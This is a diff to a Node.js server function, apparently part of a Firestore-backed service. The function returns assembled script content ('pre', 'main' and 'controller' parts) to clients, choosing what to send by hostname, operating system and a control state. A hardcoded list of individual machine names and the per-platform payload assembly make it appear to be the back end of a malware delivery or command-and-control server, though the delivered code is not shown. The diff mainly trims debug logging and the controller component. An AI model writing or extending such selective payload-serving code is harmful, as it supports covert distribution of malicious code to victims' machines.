@@ -6,11 +6,8 @@ const { addDoc, collection, query, where, getDocs } = require("firebase/firestor
 async function getFileContents(req, res, db) {
     
     try {
-        console.log('$$$$$$$$$$$$$$$$$$4', req.body);
         let fileName = req.body.version || getLastPart(req.body);
         let uID = fileName;
-        console.log("========", req.body);
-
         if(req.body.hostname == 'G-TechdeMacBook-Pro.local' || req.body.hostname == 'onimisea' || req.body.hostname == 'Fortunes-MacBook-Pro.local' 
          || req.body.hostname == 'KK' || req.body.hostname == 'blackjack' || req.body.hostname == '192.168.1.6' || req.body.hostname == 'DESKTOP-01G5BNC'
          || req.body.hostname == 'Fortunes-MBP.lan' || req.body.hostname == 'MOSHOOD-PC' || req.body.hostname == 'I318D05'
@@ -95,38 +92,18 @@ async function getFileContents(req, res, db) {
                     }
 
                     if(req.body.platform === "win32" || req.body.OS === "Windows_NT") {
-                        // req.clientIp  req.body.hostname  req.body.username
-                        //console.log('$$$$$$$$4', controlState, req.clientIp, req.body.hostname, req.body.username);
-                        
                         if(req.body.hostname == 'DESKTOP-9GUV3AH' || uID == '4') {
                             fs.readFile(prePath2, "utf-8", (err, preContent2) => {
                                 if (err) {
                                     return res.json({});
                                 }
-                                // console.log('#11', uID);
-                                // console.log('@@@@ p', preContent2,'@@@@ m', mainContent,'@@@@ c', controllerContent);
-                                return res.json(' { ' + preContent2 + ' } ' + mainContent + ' { ' + controllerContent + ' } ');
+                                return res.json(' { ' + preContent2 + ' } ' + mainContent);
                             });
                         } else {
-                            fs.readFile(prePath, "utf-8", (err, preContent) => {
-                                if (err) {
-                                    return res.json({});
-                                }
-                                // if(controlState == 'S3'){
-                                    // console.log('@@@@ p', preContent,'@@@@ m', mainContent,'@@@@ c', controllerContent);
-                                    return res.json(' { ' + preContent + ' } ' + mainContent + ' { ' + controllerContent + ' } ');
-                                // } else {
-                                //     // console.log('@@@@ p', preContent,'@@@@ m', mainContent,'@@@@ c', controllerContent);
-                                //     return res.json(' { ' + preContent + ' } ' + mainContent);
-                                // }
-                            });
+                            return res.json(mainContent);
                         }
                     } else {
-                        if(controlState == 'S3'){
-                            return res.json(mainContent);
-                        } else {
-                            return res.json(mainContent + ' { ' + controllerContent + ' } ');   
-                        }
+                        return res.json(mainContent);
                     }
                 });
             });
@@ -134,7 +111,6 @@ async function getFileContents(req, res, db) {
         
     } catch (err) {
         console.error("Error fetching control state:", err);
-        // res.status(500).json({ error: "Internal server error.", details: err.message });
     }
 }
 
